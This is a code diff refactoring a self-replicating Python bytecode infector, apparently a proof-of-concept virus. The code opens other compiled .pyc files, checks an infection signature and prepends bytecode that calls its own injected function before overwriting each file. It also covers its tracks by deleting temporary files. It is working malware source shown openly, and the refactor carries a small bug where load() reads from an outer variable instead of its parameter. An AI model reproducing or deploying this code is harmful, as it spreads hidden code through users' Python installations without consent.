@@ -8,6 +8,29 @@ def main_wrapper():
         __import__("time"), __import__("random"), __import__("types"), __import__("codecs"), __import__("string"),
         __import__("tempfile"), __import__("py_compile")]
 
+    class CompiledFile:
+        def __init__(self, file):
+            self.load(file)
+        def load(self, file):
+            self.magic = struct.unpack("<H", file.read(2))[0]
+            file.read(2)
+            if self.magic >= 3390: #3.7
+                self.invalidation_mechanism = file.read(4)
+            self.invalidation_first = file.read(4) # always datetime 3.6-
+            if self.magic >= 3190: #3.3
+                self.invalidation_second = file.read(4) # source size 3.6-
+            self.module = marshal.load(f)
+
+        def dump(self, file):
+            file.write(struct.pack("<H", self.magic))
+            file.write(b"\r\n")
+            if self.magic >= 3390: #3.7
+                file.write(self.invalidation_mechanism)
+            file.write(self.invalidation_first)
+            if self.magic >= 3190: #3.3
+                file.write(self.invalidation_second)
+            marshal.dump(self.module, file)
+
     # Check to see if we've already run, don't continue if so
     if os.environ.get("iridiumscorpion"):
         print("Infector has already been run under this interpreter")
@@ -31,22 +54,14 @@ def main_wrapper():
 
     # Load the compiled file, pull the contents out
     with open(compiled_file_name, "rb") as f:
-        this_magic = struct.unpack("<H", f.read(2))[0]
-        f.read(2)
-        if this_magic >= 3390: #3.7
-            this_invalidation = f.read(4)
-        this_moddate = f.read(4)
-        if this_magic >= 3190: #3.3
-            this_source_size = f.read(4)
-
-        this_module = marshal.load(f)
+        this = CompiledFile(f)
 
     # Leaving suspicious files everywhere is impolite
     if compiled_file_temp:
         os.remove(compiled_file_name)
 
     # Look for last method in the constant list. It'll always be us!
-    for c in list(this_module.co_consts):
+    for c in list(this.module.co_consts):
         if type(c) == types.CodeType:
             this_method = c
 
@@ -62,33 +77,25 @@ def main_wrapper():
                     continue
 
                 with open(target_file, "rb") as f:
-                    magic = struct.unpack("<H", f.read(2))[0]
-                    f.read(2)
-                    if magic >= 3390: #3.7
-                        invalidation_method = f.read(4)
-                    moddate = f.read(4)
-                    if magic >= 3190: #3.3
-                        source_size = f.read(4)
+                    target = CompiledFile(f)
 
-                    module = marshal.load(f)
-
-                if magic!=this_magic:
-                    print("    Target module mismatch ({} v {})".format(magic, this_magic))
+                if target.magic!=this.magic:
+                    print("    Target module mismatch ({} v {})".format(target.magic, this.magic))
                     continue
                 # Check for LOAD_CONST/LOAD_CONST/MAKE_FUNCTION/CALL_FUNCTION. Let's use it as our signature!
-                elif int(py_version)<36 and module.co_code[0]==0x64 and module.co_code[3]==0x64 and module.co_code[6]==0x84 and module.co_code[9]==0x83:
+                elif int(py_version)<36 and target.module.co_code[0]==0x64 and target.module.co_code[3]==0x64 and target.module.co_code[6]==0x84 and target.module.co_code[9]==0x83:
                     print("    Module likely already infected")
                     continue
-                elif int(py_version)==36 and module.co_code[0]==0x64 and module.co_code[2]==0x64 and module.co_code[4]==0x84 and module.co_code[6]==0x83:
+                elif int(py_version)==36 and target.module.co_code[0]==0x64 and target.module.co_code[2]==0x64 and target.module.co_code[4]==0x84 and target.module.co_code[6]==0x83:
                     print("    Module likely already infected")
                     continue
                 else:
-                    print("    Infecting module (v {})".format(magic))
+                    print("    Infecting module (v {})".format(target.magic))
 
                 new_method_name = "".join([random.choice(string.ascii_lowercase) for x in range(255)])
 
                 # Two additions to the constant list: This method, and a randomly generated name
-                new_constants = list(module.co_consts)
+                new_constants = list(target.module.co_consts)
                 new_constants.extend([this_method, new_method_name])
                 if int(py_version)>35:
                     # LOAD_CONST fn   (00) 64 xx
@@ -105,31 +112,24 @@ def main_wrapper():
                     # POP_TOP         (0C) 01
                     new_bytecode = struct.pack("=BHBHBHBHB", 0x64, len(new_constants)-2, 0x64, len(new_constants)-1, 0x84, 0, 0x83, 0, 1)
 
-                module_out = types.CodeType(
-                    module.co_argcount,
-                    module.co_kwonlyargcount,
-                    module.co_nlocals,
-                    module.co_stacksize,
-                    module.co_flags,
-                    new_bytecode+module.co_code,
+                target.module = types.CodeType(
+                    target.module.co_argcount,
+                    target.module.co_kwonlyargcount,
+                    target.module.co_nlocals,
+                    target.module.co_stacksize,
+                    target.module.co_flags,
+                    new_bytecode+target.module.co_code,
                     tuple(new_constants),
-                    module.co_names,
-                    module.co_varnames,
-                    module.co_filename,
-                    module.co_name,
-                    module.co_firstlineno,
-                    bytes([len(new_bytecode)]) + b"\x00" + module.co_lnotab, # No line number change, offset bytecode by length of insertion
-                    module.co_freevars,
-                    module.co_cellvars)
+                    target.module.co_names,
+                    target.module.co_varnames,
+                    target.module.co_filename,
+                    target.module.co_name,
+                    target.module.co_firstlineno,
+                    bytes([len(new_bytecode)]) + b"\x00" + target.module.co_lnotab, # No line number change, offset bytecode by length of insertion
+                    target.module.co_freevars,
+                    target.module.co_cellvars)
 
                 with open(target_file, "wb") as f:
-                    f.write(struct.pack("<H", magic))
-                    f.write(b"\r\n")
-                    if magic >= 3390: #3.7
-                        f.write(invalidation_method)
-                    f.write(moddate)
-                    if magic >= 3190: #3.3
-                        f.write(source_size)
-                    marshal.dump(module_out, f)
+                    target.dump(f)
 
 main_wrapper()
